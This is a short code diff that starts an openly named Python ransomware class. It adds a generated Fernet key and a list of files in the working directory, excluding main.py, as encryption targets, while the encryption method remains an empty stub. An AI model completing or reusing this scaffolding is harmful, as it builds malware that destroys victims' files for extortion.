@@ -5,7 +5,9 @@ import os
 
 class Ransomware:
     def __init__(self):
-        pass
+        self.key = Fernet.generate_key()
+        self.files = [file for file in os.listdir() if file !=
+                      "main.py" and os.path.isfile(file)] 
 
     def encrypt_files(self):
         pass
